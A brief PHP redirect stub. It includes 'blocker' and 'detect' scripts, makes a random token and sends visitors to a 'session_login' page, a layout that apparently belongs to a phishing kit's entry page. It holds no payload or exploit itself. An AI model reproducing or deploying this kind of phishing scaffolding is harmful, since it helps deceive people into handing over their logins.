<?php

include("../system/blocker.php");
include("../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);


header("Location:../system/session_login.php");









?>